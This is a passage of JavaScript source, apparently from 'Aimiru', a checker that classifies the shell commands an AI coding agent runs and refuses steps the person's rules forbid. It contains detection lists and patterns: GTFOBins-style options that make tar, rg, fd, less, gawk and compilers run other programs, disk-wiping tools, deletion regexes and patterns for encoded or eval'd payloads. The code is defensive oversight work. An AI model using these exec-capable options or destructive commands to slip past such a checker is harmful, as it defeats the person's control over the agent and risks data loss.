function noteProgram(out, word, isDynamic, ctx, kind = 'plain') {
  if (typeof ctx.inspectProgram !== 'function') return;
  if (isDynamic || word == null || word === '') return;
  const abs = resolvePathWord(word, ctx);
  if (!abs || !isWithin(abs, ctx.project) || abs === ctx.project) return;
  const unclear = GLOB_WORD.test(String(word));
  const shown = unclear && !ctx.cwdUnknown ? path.resolve(ctx.cwd, String(word).replace(/^~(?=$|\/)/, ctx.home)) : abs;
  if (out.programs.some((p) => p.path === shown && p.kind === kind)) return;
  out.programs.push({ path: shown, rel: path.relative(ctx.project, shown), kind, unclear, step: out.currentStep ?? null, seq: (out.partSeq = (out.partSeq || 0) + 1) });
}

// ---------------------------------------------------------------------------
// A Never inside a mixed command (Decision 9, ADR-0096). Each step that names its own resource is
// kept with its words, so the check can send it as one of the body's `parts` and Aimiru refuses the
// whole command when the person's rules never allow that one step, whatever the rest does.
// ---------------------------------------------------------------------------

/** The resources a step can name for a part: what a Never in the person's rules is written about. */
export const PART_RESOURCES = Object.freeze(['data.files', 'data.cloud', 'code.publish', 'code.deploy', 'code.force_push', 'code.db_drop', 'code.new_program', 'code.discard_work', 'code.remove_guard']);

/** Notes that the step being read names this resource, with this class (in command order). */
function notePart(out, cls, resource) {
  if (!Array.isArray(out.parts) || !out.currentStep || !PART_RESOURCES.includes(resource)) return;
  out.parts.push({ class: cls, resource, step: out.currentStep, seq: (out.partSeq = (out.partSeq || 0) + 1) });
}

/** A step's own words, as the person would read them: redacted, on one line, at most 120 characters. */
function stepText(step) {
  const words = Array.isArray(step?.words) ? step.words.map((w) => String(w)) : [];
  return truncate(redactSecrets(words.join(' ').replace(/\s+/g, ' ').trim()), 120);
}

/** At most this many parts go with one check (the server's limit, contract §1.3). */
const PARTS_MAX = 3;

/**
 * Which kinds of step go first when a command names more kinds than one check carries: the
 * strictest first (ADR-0096 review), so padding a command with more steps never pushes one out.
 */
const PART_RANK = Object.freeze(['code.db_drop', 'data.cloud', 'data.files', 'code.force_push', 'code.discard_work', 'code.remove_guard', 'code.deploy', 'code.publish', 'code.new_program']);

/**
 * The parts of a command (ADR-0096): each step whose own (class, resource) the whole action does
 * not carry, one per kind (class and resource) with the words of its first step, in command order,
 * at most 3. A step is left out only when the whole action has both its class and its resource: a
 * discard inside a push ("git reset --hard && git push", class send, resource code.discard_work)
 * still goes as a delete, so a Never written about deleting that resource refuses it (ADR-0111
 * review). A second step of the same kind adds nothing a rule could refuse, so it never takes the
 * place of another kind. When more than 3 kinds remain, the 3 strictest go (PART_RANK), still in
 * command order.
 */
function partsOf(out, wholeClass, wholeResource, newPrograms) {
  const found = [...(out.parts || [])];
  for (const p of newPrograms) if (p.step) found.push({ class: 'other', resource: NEW_PROGRAM_RESOURCE, step: p.step, seq: p.seq ?? Infinity });
  found.sort((a, b) => a.seq - b.seq);
  const kinds = [];
  const seen = new Set();
  for (const p of found) {
    if (p.resource === wholeResource && p.class === wholeClass) continue;
    const key = `${p.class}\u0000${p.resource}`;
    if (seen.has(key)) continue;
    const text = stepText(p.step);
    if (!text) continue;
    seen.add(key);
    kinds.push({ class: p.class, resource: p.resource, text, seq: p.seq });
  }
  let kept = kinds;
  if (kinds.length > PARTS_MAX) {
    const rank = (p) => {
      const i = PART_RANK.indexOf(p.resource);
      return i === -1 ? PART_RANK.length : i;
    };
    kept = [...kinds]
      .sort((a, b) => rank(a) - rank(b) || a.seq - b.seq)
      .slice(0, PARTS_MAX)
      .sort((a, b) => a.seq - b.seq);
  }
  return kept.map((p) => ({ class: p.class, resource: p.resource, text: p.text }));
}

/** How the program that runs a file looks it up (newness.mjs resolveProgramFile). */
function programKind(prog) {
  if (prog === 'node' || prog === 'nodemon') return 'node';
  if (prog === 'python' || prog === 'python3') return 'python';
  if (prog === 'bun' || prog === 'tsx' || prog === 'ts-node' || prog === 'vite-node') return 'bun';
  return 'plain';
}

/** Package manager steps that only show something: they run none of the package's scripts. */
const PACKAGE_INFO_STEPS = new Set(['', 'ls', 'list', 'll', 'la', 'why', 'explain', 'root', 'prefix', 'bin', 'help', 'view', 'info', 'outdated', 'audit', 'config', 'get', 'whoami', 'search']);

/**
 * True when a package manager step runs scripts from the package.json (ADR-0090 review): npm test,
 * npm run x, pnpm x, yarn start, bun run x, and the steps that run its lifecycle scripts (install,
 * ci, pack, version ...). A changed script is a program the agent wrote, as a new file is.
 */
function runsPackageScripts(prog, pm, args, argDyn, ctx) {
  if (!pm || pm.unknown || pm.dynamic || PACKAGE_INFO_STEPS.has(pm.sub)) return false;
  if (prog === 'npm' && pm.sub === 'version' && args.length <= pm.at + 1) return false;
  const isRun = prog === 'npm' ? ['run', 'run-script', 'rum', 'urn'].includes(pm.sub) : pm.sub === 'run';
  if (isRun && packageScriptOf(prog, pm, args, argDyn, ctx) === null) return false;
  // bun test and bun build are bun's own; bun x.ts runs a file.
  if (prog === 'bun' && (pm.sub === 'test' || pm.sub === 'build' || bunProgramFile(args, argDyn, ctx, pm))) return false;
  return true;
}

/** The makefile make reads: the -f file (in the -C folder), or the folder make looks in. Null when unknown. */
function makefileOf(args, argDyn, ctx) {
  if (ctx.cwdUnknown) return null;
  let dir = ctx.cwd;
  let file = null;
  for (let k = 0; k < args.length; k += 1) {
    const a = String(args[k]);
    if (a === '--') break;
    const m = /^(-C|--directory|-f|--file|--makefile)(=(.*))?$/.exec(a) || /^(-C|-f)(.+)$/.exec(a);
    if (!m) continue;
    let v;
    let dyn;
    if (m[2] !== undefined && m[1].startsWith('--')) {
      v = m[3];
      dyn = argDyn[k];
    } else if (m[2] !== undefined) {
      v = m[2];
      dyn = argDyn[k];
    } else {
      k += 1;
      v = args[k];
      dyn = argDyn[k];
    }
    if (dyn || v == null) return null;
    const p = path.resolve(dir, String(v).replace(/^~(?=$|\/)/, ctx.home));
    if (m[1] === '-C' || m[1] === '--directory') dir = p;
    else if (!file) file = p;
  }
  if (file) return file;
  // By the names in the folder, not by asking for each: a folder that ignores case would answer
  // "makefile" for a Makefile.
  let names = [];
  try {
    names = fs.readdirSync(dir);
  } catch {
    return null;
  }
  const name = ['GNUmakefile', 'makefile', 'Makefile'].find((n) => names.includes(n));
  return name ? path.join(dir, name) : null;
}

/**
 * What deno run runs (ADR-0090 review): {operand, operandDynamic, loads} after its own options, or
 * {unknown} for an option Aimiru does not know, or null for another deno step.
 */
const DENO_RUN_VALUES = new Set(['-c', '--config', '--import-map', '--cert', '--location', '--seed', '--ext', '-L', '--log-level', '--conditions', '--preload', '--require', '--import']);
const DENO_RUN_LOADS = new Set(['--preload', '--require', '--import']);
const DENO_RUN_SWITCHES = /^(--(allow-|deny-|unstable|inspect|watch|no-|env-file|lock|node-modules-dir|reload|check|frozen|vendor|coverage|cached-only|quiet|v8-flags|unsafely-ignore-certificate-errors|strace-ops|hmr|permit-no-files|enable-testing-features-do-not-use)[^=]*(=.*)?|-[AqrRWNESIP]+(=.*)?)$/s;
function denoRunTarget(args, argDyn) {
  const k0 = nonFlagIndex(args);
  if (args[k0] !== 'run') return null;
  const loads = [];
  for (let k = k0 + 1; k < args.length; k += 1) {
    const a = String(args[k]);
    if (a === '--') return { operand: args[k + 1], operandDynamic: Boolean(argDyn[k + 1]), loads };
    if (!a.startsWith('-') || a === '-') return { operand: a, operandDynamic: Boolean(argDyn[k]), loads };
    const eq = a.indexOf('=');
    const name = eq === -1 ? a : a.slice(0, eq);
    if (DENO_RUN_VALUES.has(name)) {
      const v = eq === -1 ? args[k + 1] : a.slice(eq + 1);
      const dyn = eq === -1 ? argDyn[k + 1] : argDyn[k];
      if (eq === -1) k += 1;
      if (DENO_RUN_LOADS.has(name)) loads.push({ value: String(v ?? ''), dynamic: Boolean(dyn) });
      continue;
    }
    if (DENO_RUN_SWITCHES.test(a)) continue;
    return { unknown: `runs deno with an option Aimiru does not know (${name})` };
  }
  return { operand: undefined, operandDynamic: false, loads };
}

/** Files of the project a step writes (redirects, cp, tee, sed -i, curl -o ...): a program run after them is new. */
function noteWritten(out, p) {
  if (p) out.written.add(p);
}

/** git steps that change files in the working folder, so a program in it may not be the committed one. */
const GIT_TREE_STEPS = new Set(['checkout', 'switch', 'restore', 'reset', 'apply', 'am', 'cherry-pick', 'merge', 'pull', 'rebase', 'revert', 'stash', 'clone', 'worktree', 'read-tree', 'checkout-index', 'submodule']);

const HINT_TEXT_LIMIT = 256 * 1024;

const DELETES_IN_CODE = /\b(rmSync|rmdirSync|unlinkSync|rimraf|shutil\.rmtree|os\.remove|os\.unlink|os\.rmdir|FileUtils\.rm\w*|File\.delete|deleteMany|deleteObjects?|drop_table|DROP\s+(TABLE|DATABASE|SCHEMA))\b|\bfs\.(promises\.)?(rm|unlink|rmdir)\b|\brm\s+-[A-Za-z]*[rf]/i;
const STARTS_PROGRAMS = /\b(child_process|execSync|execFileSync|spawnSync|execa|subprocess|os\.system|os\.popen|Popen|Kernel\.system|IO\.popen|Bun\.spawn|Deno\.Command)\b/;
const ENCODED_PARTS = /\b(atob|b64decode|fromCharCode|unescape)\s*\(|Buffer\.from\([^)]{0,300}['"](base64|hex)['"]|\beval\s*\(|new\s+Function\s*\(|\bexec\s*\(\s*(compile|base64)|[A-Za-z0-9+/]{400,}={0,2}/;

/**
 * What a quick read of the file's text adds to the question (never to the answer): the addresses
 * it calls (payment and message hosts first), and whether it deletes, starts other programs or
 * has encoded parts. At most three hints.
 */
export function programHints(content) {
  if (!content || !content.length) return [];
  const text = content.subarray(0, HINT_TEXT_LIMIT).toString('utf8');
  const hosts = [];
  const add = (h) => {
    const host = String(h || '').toLowerCase();
    if (host && !hosts.includes(host)) hosts.push(host);
  };
  for (const d of [...PAYMENT_DOMAINS, ...MESSAGE_HOSTS]) if (text.includes(d)) add(d);
  for (const u of urlsIn(text)) add(hostOf(u));
  // Payment and message services first, each named by its site as a person knows it
  // (stripe.com, not api.stripe.com), as a counterparty is.
  const ranked = hosts
    .filter((h) => h !== 'localhost' && h !== '127.0.0.1')
    .sort((x, y) => Number(isPaymentHost(y) || isMessageUrl(`https://${y}/`)) - Number(isPaymentHost(x) || isMessageUrl(`https://${x}/`)));
  const sites = [...new Set(ranked.map((h) => counterpartyOf(`https://${h}/`)).filter(Boolean))];
  const hints = [];
  if (sites.length) hints.push(`calls ${sites.slice(0, 2).join(' and ')}`);
  if (DELETES_IN_CODE.test(text)) hints.push('deletes files or data');
  if (STARTS_PROGRAMS.test(text)) hints.push('starts other programs');
  if (ENCODED_PARTS.test(text)) hints.push('has encoded or hidden parts');
  return hints.slice(0, 3);
}

/** True when this command writes the file before running it, or something Aimiru cannot list. */
function changedByCommand(out, p, file) {
  if (out.treeChanges) return true;
  const stem = `${path.basename(p)}.`;
  for (const w of out.written) {
    for (const x of [p, file].filter(Boolean)) {
      if (w === x || isWithin(x, w) || isWithin(w, x)) return true;
    }
    // node scripts/cleanup runs the cleanup.js this command writes.
    if (path.dirname(w) === path.dirname(p) && path.basename(w).startsWith(stem)) return true;
  }
  return false;
}

/**
 * The programs a command runs that count as new, from out.programs (ADR-0090): each with the file
 * that runs, its path in the project, the sha256 of its content, why it is new, the hints from its
 * text, and whether the person allowed that same content in this session (ctx.programAllowed).
 */
function newProgramsOf(out, ctx) {
  const found = [];
  if (typeof ctx.inspectProgram !== 'function') return found;
  for (const p of out.programs) {
    let info;
    if (p.unclear) info = { exists: true, isNew: true, why: 'cannot tell which file runs', sha256: null, hints: [] };
    else {
      try {
        info = ctx.inspectProgram(p.path, p.kind) || { exists: false };
      } catch {
        info = { exists: true, isNew: true, why: 'unreadable', sha256: null, hints: [] };
      }
    }
    const file = typeof info.file === 'string' && info.file ? info.file : p.path;
    const changedHere = changedByCommand(out, p.path, file);
    if (!info.exists && !changedHere) continue; // not there, and nothing here writes it: it cannot run
    if (!info.isNew && !changedHere) continue;
    if (found.some((f) => f.path === file)) continue;
    const why = changedHere ? 'changed by this same command' : info.why;
    const sha256 = changedHere ? null : info.sha256 ?? null;
    let remembered = false;
    if (sha256 && typeof ctx.programAllowed === 'function') {
      try {
        remembered = ctx.programAllowed(file, sha256) === true;
      } catch {
        remembered = false;
      }
    }
    const entry = { path: file, rel: path.relative(ctx.project, file), sha256, why, hints: info.hints || [], remembered };
    // The step that runs it, for the command's parts (ADR-0096); never sent or kept.
    Object.defineProperty(entry, 'step', { value: p.step ?? null, enumerable: false });
    Object.defineProperty(entry, 'seq', { value: p.seq ?? Infinity, enumerable: false });
    found.push(entry);
  }
  return found;
}
const SYSTEM_WRITERS = new Set(['defaults', 'launchctl', 'crontab', 'systemctl', 'scutil', 'networksetup', 'pmset', 'sysctl', 'nvram', 'csrutil', 'spctl', 'chsh', 'dscl', 'visudo', 'update-rc.d', 'service', 'sc', 'reg', 'setx']);
const DISK_DESTROYERS = new Set(['mkfs', 'wipefs', 'fdisk', 'sfdisk', 'parted', 'shred', 'srm', 'format-volume', 'clear-disk', 'format']);
const FILE_WRITERS_LAST_ARG = new Set(['cp', 'mv', 'install', 'ln', 'rsync', 'ditto', 'copy-item', 'move-item']);
const FILE_WRITERS_ALL_ARGS = new Set(['touch', 'mkdir', 'chmod', 'chown', 'chgrp', 'chflags', 'xattr', 'truncate', 'tee', 'set-content', 'add-content', 'out-file', 'new-item']);
const DELETERS = new Set(['rm', 'rmdir', 'unlink', 'trash', 'remove-item', 'del', 'erase', 'rd']);
const CLOUD_CLIS = new Set(['aws', 'gcloud', 'gsutil', 'az', 'kubectl', 'helm', 'terraform', 'tofu', 'pulumi', 'doctl', 'flyctl', 'fly', 'heroku', 'vercel', 'netlify', 'wrangler', 'supabase', 'firebase', 'railway', 'render', 'gh', 'glab', 'linode-cli', 'hcloud', 'oci', 'ibmcloud', 'scw', 'vultr-cli', 'eksctl', 'docker', 'podman', 's3cmd', 'rclone', 'mc']);

// ---------------------------------------------------------------------------
// Local work: the only commands classed "read". Everything not recognised here or by a rule
// above is "other" and held when Aimiru cannot be asked (spec §0.1.5: the stricter class when unsure).

/** Programs that only look at or change files in the project, with no network and no outside effect. */
const LOCAL_PROGRAMS = new Set(`
ls dir vdir tree exa eza lsd cat bat less more head tail wc grep egrep fgrep rg ag ack fd find locate
cut tr sort uniq comm join paste column fold fmt nl rev tac expand unexpand split csplit
diff diff3 sdiff cmp colordiff delta awk gawk mawk nawk sed gsed jq yq gojq
file stat du df realpath readlink basename dirname pwd which whereis type hash man info apropos
echo printf true false test [ [[ ]] : sleep seq yes date cal printenv id whoami groups uname hostname uptime
ps pgrep pidof top htop lsof free vm_stat sw_vers arch nproc getconf locale tput clear reset tty stty history
netstat ss pbpaste kill pkill md5 md5sum sha1sum sha256sum sha512sum shasum cksum b2sum base64 xxd hexdump od strings
gzip gunzip zcat bzip2 bunzip2 xz unxz zstd unzstd tar bsdtar gtar zip unzip
mkdir touch cp mv ln rm rmdir chmod tee
for in do done if then else elif fi case esac while until select function return break continue exit shift unset
read getopts shopt ulimit umask wait jobs fg bg let logout disown times dirs popd pushd cd
tsc tsx ts-node vitest jest mocha ava c8 nyc eslint prettier biome oxlint stylelint knip tsup vite vue-tsc svelte-check
astro next nuxt remix turbo nx rollup webpack esbuild swc babel postcss tailwindcss lint-staged concurrently rimraf nodemon
pytest mypy ruff black isort flake8 pylint pyright coverage tox nox rspec rubocop rake
make gmake cmake ninja meson gradle gradlew mvn mvnw bazel bazelisk ant rustc rustfmt gcc g++ cc c++ clang clang++ ld ar
javac java kotlinc scalac swiftc
get-childitem gci get-content gc select-string sls where-object where ? foreach-object foreach % select-object
sort-object group-object measure-object measure format-table ft format-list fl format-wide fw out-string out-host out-null
write-host write-output write write-error write-warning write-verbose write-debug write-information get-location gl
test-path resolve-path rvpa split-path join-path convertto-json convertfrom-json convertto-csv convertfrom-csv import-csv
get-date get-process gps get-command gcm get-help get-item gi get-itemproperty gp get-member gm get-variable gv
set-variable new-variable get-alias start-sleep clear-host cls compare-object compare get-filehash get-psdrive get-host
get-culture get-random get-unique new-object elseif switch try catch finally param begin process end filter throw
set-location sl get-service
`.split(/\s+/).filter(Boolean));

/** Programs whose first word picks the step: the steps that are local work (npm, pnpm, yarn and bun: PACKAGE_MANAGERS). */
const LOCAL_STEPS = {
  deno: ['', 'test', 'fmt', 'lint', 'check', 'task', 'bench', 'doc', 'info', 'repl', 'coverage', 'types', 'help'],
  go: ['build', 'test', 'run', 'vet', 'fmt', 'env', 'version', 'doc', 'generate', 'tool', 'help', 'clean', 'list', 'work'],
  cargo: ['build', 'b', 'test', 't', 'run', 'r', 'check', 'c', 'clippy', 'fmt', 'doc', 'bench', 'clean', 'tree', 'metadata', 'new', 'init', 'version', 'help', 'nextest', 'expand'],
  pip: ['', 'list', 'show', 'freeze', 'check', 'help'],
  pip3: ['', 'list', 'show', 'freeze', 'check', 'help'],
  uv: ['venv', 'version', 'tree', 'help'],
  poetry: ['run', 'shell', 'check', 'show', 'build', 'env', 'version'],
  bundle: ['exec', 'check', 'list', 'show'],
  swift: ['build', 'test', 'run', 'format'],
  dotnet: ['build', 'test', 'run', 'format', 'clean'],
  docker: ['ps', 'images', 'logs', 'inspect', 'version', 'info', 'stats', 'top'],
  playwright: ['test', 'show-report', 'show-trace'],
};

/** Project tools that npx, pnpm dlx, bunx and the like run locally: the package name, and its program. */
const DEV_TOOLS = new Map([
  ['tsc', 'tsc'], ['tsx', 'tsx'], ['ts-node', 'ts-node'], ['vitest', 'vitest'], ['jest', 'jest'], ['mocha', 'mocha'], ['ava', 'ava'],
  ['c8', 'c8'], ['nyc', 'nyc'], ['eslint', 'eslint'], ['prettier', 'prettier'], ['biome', 'biome'], ['@biomejs/biome', 'biome'],
  ['oxlint', 'oxlint'], ['stylelint', 'stylelint'], ['knip', 'knip'], ['tsup', 'tsup'], ['vite', 'vite'], ['vue-tsc', 'vue-tsc'],
  ['svelte-check', 'svelte-check'], ['astro', 'astro'], ['next', 'next'], ['nuxt', 'nuxt'], ['turbo', 'turbo'], ['nx', 'nx'],
  ['rollup', 'rollup'], ['webpack', 'webpack'], ['esbuild', 'esbuild'], ['swc', 'swc'], ['babel', 'babel'], ['postcss', 'postcss'],
  ['tailwindcss', 'tailwindcss'], ['lint-staged', 'lint-staged'], ['concurrently', 'concurrently'], ['rimraf', 'rimraf'],
  ['nodemon', 'nodemon'], ['playwright', 'playwright'],
]);

/** Folders where a tool's own name can be trusted ("/usr/bin/grep" is grep). */
const SYSTEM_BIN_DIRS = ['/bin', '/usr/bin', '/usr/local/bin', '/sbin', '/usr/sbin', '/opt/homebrew/bin', '/opt/local/bin'];

/**
 * Reads a tool's options getopt-style and calls visit(name, value, valueDynamic, given) for each:
 * short letters grouped ("-xvf a.tar") or glued to their value ("-Ifoo"); long names given by any
 * prefix ("--to-com=x"), `given` being what was typed. `value` letters take a value (glued or the
 * next word), `glued` letters only a glued one. Stops at "--".
 */
function scanOptions(args, argDyn, spec, visit, { bundleFirst = false } = {}) {
  const names = [...new Set([...(spec.long || []), ...(spec.longBool || []), ...(spec.danger || []).filter((d) => d.length > 1)])];
  for (let k = 0; k < args.length; k += 1) {
    const a = args[k];
    if (a === '--') break;
    if (a.startsWith('--')) {
      const eq = a.indexOf('=');
      const given = a.slice(2, eq === -1 ? undefined : eq);
      const r = resolveLong(given, names);
      const takes = r.name != null && (spec.long || []).includes(r.name);
      let value = eq === -1 ? null : a.slice(eq + 1);
      let dyn = Boolean(argDyn[k]);
      if (eq === -1 && takes) {
        k += 1;
        value = args[k] ?? null;
        dyn = Boolean(argDyn[k]);
      }
      visit(r.name ?? given, value, dyn, given, r.ambiguous === true);
      continue;
    }
    let bundle = null;
    if (a.startsWith('-') && a.length > 1) bundle = a.slice(1);
    else if (bundleFirst && k === 0 && /^[A-Za-z]+$/.test(a)) bundle = a; // "tar xzf a.tar"
    if (bundle == null) continue;
    for (let j = 0; j < bundle.length; j += 1) {
      const ch = bundle[j];
      const rest = bundle.slice(j + 1);
      if ((spec.value || '').includes(ch)) {
        if (rest) visit(ch, rest, Boolean(argDyn[k]));
        else {
          k += 1;
          visit(ch, args[k] ?? null, Boolean(argDyn[k]));
        }
        break;
      }
      if ((spec.glued || '').includes(ch)) {
        visit(ch, rest, Boolean(argDyn[k]));
        break;
      }
      visit(ch, null, false);
    }
  }
}

/**
 * A long option as getopt_long reads it: the exact name, or the one name a prefix of any length
 * fits. A prefix that fits several names is ambiguous.
 */
function resolveLong(given, names) {
  if (names.includes(given)) return { name: given };
  const hits = names.filter((n) => n.startsWith(given));
  if (hits.length === 1) return { name: hits[0] };
  return hits.length ? { name: null, ambiguous: true } : { name: null };
}

/** True when a long option, as typed, can mean a dangerous one: by its exact name or any prefix of one. */
function longMayBe(given, exactNames, danger) {
  if (danger.includes(given)) return true;
  if (exactNames.includes(given)) return false; // an exact match wins over longer names
  return danger.some((d) => d.length > 1 && d.startsWith(given));
}

/** Options of otherwise local tools that run another program (GTFOBins-style). */
const DANGEROUS_OPTIONS = {
  tar: {
    value: 'fCTXbHKLNVgIF',
    long: ['file', 'directory', 'files-from', 'exclude-from', 'to-command', 'checkpoint-action', 'use-compress-program', 'info-script', 'new-volume-script', 'rsh-command', 'rmt-command'],
    danger: ['I', 'F', 'to-command', 'checkpoint-action', 'use-compress-program', 'info-script', 'new-volume-script', 'rsh-command', 'rmt-command'],
    bundleFirst: true,
  },
  bsdtar: { value: 'fCTXbsI', long: ['file', 'directory', 'use-compress-program'], danger: ['I', 'use-compress-program'], bundleFirst: true },
  zip: { value: 'bnt', long: ['unzip-command'], danger: ['unzip-command'], extra: /^-[A-Za-z]*TT/ },
  sort: { value: 'kotST', long: ['compress-program', 'files0-from', 'random-source', 'output', 'key', 'field-separator', 'buffer-size', 'temporary-directory', 'batch-size', 'parallel'], danger: ['compress-program'] },
  split: { value: 'abCln', long: ['filter', 'bytes', 'line-bytes', 'lines', 'number', 'suffix-length', 'additional-suffix'], danger: ['filter'] },
  diff3: { value: 'L', long: ['diff-program', 'label'], danger: ['diff-program'] },
  sdiff: { value: 'ow', long: ['diff-program', 'output', 'width'], danger: ['diff-program'] },
  man: { value: 'CMPLmSsepErRTHK', long: ['pager', 'html', 'config-file', 'manpath', 'locale', 'systems', 'sections', 'extension', 'preprocessor', 'encoding', 'prompt', 'recode', 'troff-device'], danger: ['P', 'H', 'pager', 'html'] },
  rg: { value: 'ABCEegjMmrTtfd', long: ['pre', 'pre-glob', 'after-context', 'before-context', 'context', 'encoding', 'regexp', 'glob', 'threads', 'max-columns', 'max-count', 'replace', 'type-not', 'type', 'file', 'max-depth'], danger: ['pre'] },
  fd: { value: 'deEtcjSo', long: ['exec', 'exec-batch', 'max-depth', 'exclude', 'type', 'extension', 'color', 'threads', 'size', 'owner'], danger: ['x', 'X', 'exec', 'exec-batch'] },
};
Object.assign(DANGEROUS_OPTIONS, {
  ag: { value: 'ABCGgmp', long: ['pager', 'after', 'before', 'context', 'file-search-regex', 'ignore', 'max-count', 'path-to-ignore', 'depth', 'workers'], danger: ['pager'] },
  ack: { value: 'ABCgm', long: ['pager', 'after-context', 'before-context', 'context', 'type', 'ignore-dir', 'max-count', 'ackrc', 'output'], danger: ['pager', 'ackrc'] },
  bat: { value: 'lmLpH', long: ['pager', 'language', 'map-syntax', 'theme', 'style', 'line-range', 'highlight-line', 'paging', 'wrap', 'tabs', 'config-file', 'config-dir'], danger: ['pager', 'config-file', 'config-dir'] },
  gawk: { value: 'fvFlEeih', long: ['load', 'file', 'assign', 'field-separator', 'source', 'exec', 'include', 'dump-variables', 'profile', 'pretty-print'], danger: ['l', 'load', 'E', 'exec'] },
  less: { value: 'bhjkoOpPtTxyz', long: ['log-file', 'LOG-FILE', 'pattern', 'prompt', 'tag', 'tag-file', 'lesskey-file', 'lesskey-src'], danger: ['k', 'lesskey-file', 'lesskey-src'], extra: /^\+.*!/ },
});
DANGEROUS_OPTIONS.more = { value: 'n', long: [], danger: [], extra: /^\+.*!/ };
DANGEROUS_OPTIONS.gtar = DANGEROUS_OPTIONS.tar;
DANGEROUS_OPTIONS.gsort = DANGEROUS_OPTIONS.sort;

/** True when a local tool is told to run another program (by any spelling getopt accepts). */
function hasDangerousOption(prog, args, argDyn) {
  const spec = DANGEROUS_OPTIONS[prog];
  if (!spec) return false;
  if (spec.extra && args.some((a) => spec.extra.test(a))) return true;
  let hit = false;
  const exact = [...(spec.long || []), ...(spec.longBool || [])];
  scanOptions(args, argDyn, spec, (name, value, dyn, given, ambiguous) => {
    // A long option counts by any prefix of a dangerous name; an ambiguous one fails closed.
    if (given != null ? ambiguous || longMayBe(given, exact, spec.danger) : spec.danger.includes(name)) hit = true;
  }, { bundleFirst: spec.bundleFirst });
  return hit;
}

/** Options that point a build tool at files, folders or code elsewhere: each must be in the project. */
const PATH_OPTIONS = {
  make: {
    value: 'CfIoWE', glued: 'jlO', long: ['directory', 'file', 'makefile', 'include-dir', 'old-file', 'assume-old', 'new-file', 'assume-new', 'what-if', 'eval', 'jobs', 'load-average', 'max-load', 'output-sync', 'debug', 'jobserver-style', 'shuffle'],
    longBool: ['always-make', 'environment-overrides', 'ignore-errors', 'keep-going', 'just-print', 'dry-run', 'recon', 'print-data-base', 'question', 'no-builtin-rules', 'no-builtin-variables', 'silent', 'quiet', 'stop', 'no-keep-going', 'touch', 'trace', 'version', 'print-directory', 'no-print-directory', 'warn-undefined-variables', 'check-symlink-times', 'help'],
    paths: ['C', 'f', 'I', 'directory', 'file', 'makefile', 'include-dir'], danger: ['E', 'eval'],
  },
  cargo: { value: 'pjFZ', long: ['manifest-path', 'target-dir', 'config', 'package', 'features', 'jobs', 'target', 'profile', 'bin', 'example', 'test', 'bench', 'color', 'message-format', 'lockfile-path', 'artifact-dir'], paths: ['manifest-path', 'target-dir', 'lockfile-path', 'artifact-dir'], danger: ['config', 'Z'] },
  gradle: { value: 'pbcIgx', glued: 'DP', long: ['project-dir', 'build-file', 'settings-file', 'init-script', 'gradle-user-home', 'include-build', 'exclude-task', 'project-cache-dir'], paths: ['p', 'b', 'c', 'I', 'g', 'project-dir', 'build-file', 'settings-file', 'init-script', 'gradle-user-home', 'include-build', 'project-cache-dir'] },
};
// Project tools whose config and plugin options load code: the files must be in the project.
const configTool = (value, long, paths, extra = {}) => ({ value, long, paths, ...extra });
Object.assign(PATH_OPTIONS, {
  eslint: configTool('cf', ['config', 'rulesdir', 'resolve-plugins-relative-to', 'plugin', 'parser', 'format', 'output-file', 'ignore-path', 'cache-location'], ['c', 'config', 'rulesdir', 'resolve-plugins-relative-to', 'f', 'format']),
  prettier: configTool('', ['config', 'plugin', 'plugin-search-dir', 'ignore-path', 'cache-location'], ['config', 'plugin', 'plugin-search-dir']),
  vitest: configTool('cr', ['config', 'root', 'dir', 'workspace', 'globalSetup', 'setupFiles', 'environment'], ['c', 'config', 'r', 'root', 'dir', 'workspace']),
  jest: configTool('c', ['config', 'rootDir', 'roots', 'setupFiles', 'globalSetup', 'globalTeardown', 'testEnvironment', 'transform'], ['c', 'config', 'rootDir', 'roots']),
  vite: configTool('c', ['config', 'configLoader', 'base', 'mode'], ['c', 'config']),
  webpack: configTool('c', ['config', 'entry', 'output-path'], ['c', 'config']),
  rollup: configTool('cp', ['config', 'plugin', 'input', 'file', 'dir'], ['c', 'config', 'p', 'plugin']),
  tsc: configTool('p', ['project', 'build', 'outDir', 'rootDir', 'plugins'], ['p', 'project']),
  babel: configTool('', ['config-file', 'plugins', 'presets'], ['config-file']),
  postcss: configTool('', ['config', 'use'], ['config']),
  tailwindcss: configTool('c', ['config'], ['c', 'config']),
  cmake: configTool('CPSB', [], ['C', 'P', 'S', 'B']),
  ninja: configTool('Cf', [], ['C', 'f']),
  ant: configTool('f', ['buildfile', 'file', 'lib', 'propertyfile'], ['f', 'buildfile', 'file', 'lib', 'propertyfile']),
  bazel: configTool('', ['bazelrc', 'output_base', 'output_user_root', 'override_repository'], ['bazelrc', 'output_base', 'output_user_root']),
  javac: configTool('d', ['processor-path', 'processorpath', 'class-path', 'classpath', 'module-path', 'plugin'], ['processor-path', 'processorpath', 'class-path', 'classpath', 'module-path'], {
    extra: (args, argDyn, ctx) => {
      for (let k = 0; k < args.length; k += 1) {
        const a = args[k];
        if (/^-(Xplugin|J)/.test(a)) return 'runs javac with a plugin or Java options that can load code';
        if (/^-(processorpath|cp|classpath|p)$/.test(a) && String(args[k + 1] ?? '').split(/[:;]/).some((e) => e && !insideProject(e, argDyn[k + 1], ctx))) return 'runs javac with code from outside the project';
      }
      return null;
    },
  }),
});
// Compilers: options that run or load another program.
const COMPILER_DANGER = {
  gcc: /^(-wrapper|-B|-fplugin|-specs|--specs|-iplugindir|-fplugin-arg)/,
  rustc: /^(-C\s*linker|-Clinker|-Z|--codegen=linker|-C$)/,
  kotlinc: /^-Xplugin/,
  ld: /^(-plugin|--plugin)/,
};
for (const name of ['g++', 'cc', 'c++', 'clang', 'clang++']) COMPILER_DANGER[name] = COMPILER_DANGER.gcc;
PATH_OPTIONS.gmake = PATH_OPTIONS.make;
PATH_OPTIONS.gradlew = PATH_OPTIONS.gradle;

/**
 * Why a build tool's options take it outside the project (another folder, makefile, manifest or
 * class path; a setting that runs a program), or null.
 */
function buildToolOutside(prog, args, argDyn, ctx) {
  const spec = PATH_OPTIONS[prog];
  if (spec) {
    let reason = null;
    const exact = [...(spec.long || []), ...(spec.longBool || [])];
    scanOptions(args, argDyn, spec, (name, value, dyn, given, ambiguous) => {
      if (ambiguous) reason = `runs ${prog} with an option Aimiru cannot place`;
      else if (given != null ? longMayBe(given, exact, spec.danger || []) : (spec.danger || []).includes(name)) reason = `runs ${prog} with settings that can run another program`;
      else if (spec.paths.includes(name) && (value === '-' || !insideProject(value, dyn, ctx))) reason = `runs ${prog} on files outside the project`;
    }, { bundleFirst: spec.bundleFirst });
